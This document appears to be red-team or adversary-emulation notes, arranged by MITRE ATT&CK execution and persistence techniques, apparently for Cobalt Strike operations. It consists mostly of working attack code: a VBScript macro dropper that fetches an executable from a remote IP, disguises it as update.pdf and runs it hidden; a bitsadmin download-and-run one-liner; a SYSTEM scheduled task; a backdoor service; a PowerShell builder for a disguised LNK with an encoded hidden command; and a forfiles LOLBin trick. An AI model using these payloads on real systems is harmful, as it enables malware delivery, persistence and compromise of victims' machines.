


PowerShell T1059.001 

cobalt

Visual Basic T1059.005

```vbs
Sub obf_LaunchCommand(ByVal obf_command)
    With CreateObject("WScript.Shell")
        .Run .ExpandEnvironmentStrings(obf_command), 0, False
    End With
End Sub

Function obf_SaveToFile(ByVal obf_saveAs, ByRef obf_data())

    Dim obf_out
    Dim obf_shell: Set obf_shell = CreateObject("WScript.Shell")
    obf_out = obf_shell.ExpandEnvironmentStrings(obf_saveAs)

    With CreateObject("Adodb.Stream")
        .Type = 1
        .Open
        .write obf_data
        .savetofile obf_out, 2
    End With
    obf_SaveToFile = True
    Exit Function

    obf_SaveToFile = False
End Function

Function obf_DownloadFromURL(ByVal obf_URL)

    With CreateObject("Microsoft.XMLHTTP")
        .Open "GET", obf_URL, False
        .setRequestHeader "Accept", "*/*"
        .setRequestHeader "Accept-Language", "en-US,en;q=0.9"
        .setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36 Edg/86.0.622.69"
        .setRequestHeader "Accept-Encoding", "gzip, deflate"
        .setRequestHeader "Cache-Control", "private, no-store, max-age=0"
        .setRequestHeader "DNT", "1"
        .Send

        If .Status = 200 Then
            obf_DownloadFromURL = .ResponseBody
            Exit Function
        End If
    End With

    obf_DownloadFromURL = ""
End Function

Sub obf_DropFile(ByVal obf_saveto)
    Dim obf_code
    Dim obf_bytes
    Dim obf_LaunchIt
    obf_LaunchIt = True
    
    obf_bytes = obf_DownloadFromURL("http://192.168.174.151/update.exe")
    
    If obf_SaveToFile(obf_saveto, obf_bytes) And obf_LaunchIt Then
        obf_LaunchCommand "conhost C:\Users\Public\update.pdf"
    End If
End Sub

Sub obf_MacroEntryPoint()
    On Error Resume Next

    Dim obf_location, obf_path
    Dim obf_LaunchIt
    obf_LaunchIt = True
    
    Dim obf_shell: Set obf_shell = CreateObject("WScript.Shell")
    obf_path = obf_shell.ExpandEnvironmentStrings("C:\Users\Public\")
    obf_location = obf_path & "update.pdf"

    Dim obf_FSO: Set obf_FSO = CreateObject("Scripting.FileSystemObject")

    If obf_FSO.FolderExists(obf_path) Then
        If obf_FSO.FileExists(obf_location) = False Then
            obf_DropFile obf_location
        ElseIf obf_LaunchIt Then
            obf_LaunchCommand "conhost C:\Users\Public\update.pdf"
        End If
    Else
        obf_FSO.CreateFolder (obf_path)
        If obf_FSO.FileExists(obf_location) = False Then
            obf_DropFile obf_location
        ElseIf obf_LaunchIt Then
            obf_LaunchCommand "conhost C:\Users\Public\update.pdf"
        End If
    End If
End Sub

obf_MacroEntryPoint

```


Windows Command Shell T1059.003

Run payload with .bat

```cmd
bitsadmin.exe /transfer test /download /priority normal http://192.168.174.151/update.exe C:\Users\Public\update.pdf && conhost C:\Users\Public\update.pdf
```



Native API T1106 =>

Create Process Cobalt strike

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"c:\users\public\createprocess.exe" /target:exe "c:\users\public\CreateProcess.cs"
```
```powershell
c:\users\public\createprocess.exe
```


Scheduled Job/Task =>

Cron T1053.003


Scheduled Task T1053.005


```cmd
schtasks /Create /SC DAILY /TN "MyTask" /TR "powershell.exe -ExecutionPolicy Bypass -File 'c:\users\public\backup.ps1'" /ST 00:01 /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /IT
```
```cmd
schtasks /Query /TN "MyTask"
```
```cmd
schtasks /Run /TN "MyTask"
```


System Services =>

Service Execution T1569.002

Service Payload

```cmd
sc.exe create servicebackdoor binPath= "c:\users\public\service.exe" 
sc.exe start servicebackdoor
sc.exe stop servicebackdoor
sc.exe delete servicebackdoor
```


User Execution =>
Malicious File T1204.002

Macro office cobalt


chain of executable files

```text
.ps1 > url > .zip > .exe
```

```text
.pdf > url > .zip > .js > .js > .dll
```

```text
.pdf > url > .js > .msi > .dll
```

```text
url > .js > .msi > .dll
```



```powershell
echo "calc" > c:\shell.cmd

$command = 'Start-Process c:\shell.cmd'

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)

$encodedCommand = [Convert]::ToBase64String($bytes)

  

$obj = New-object -comobject wscript.shell

$link = $obj.createshortcut("C:\users\soheil\desktop\APT38\3-Initial Access\test.lnk")

$link.windowstyle = "7"

$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

$link.iconlocation = "%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe"

$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAHMAaABlAGwAbAAuAGMAbQBkAA=="

$link.save()
```


create lnk
```powershell
.\gen-embed-zip.exe c:\malware.zip Report.lnk malware.exe
```


lolbins run malware
```cmd
forfiles /p c:\windows\system32 /m user32.dll /c "0x630x6d0x640x200x2f0x63 notepad | calc"
```


Run payload cobalt strike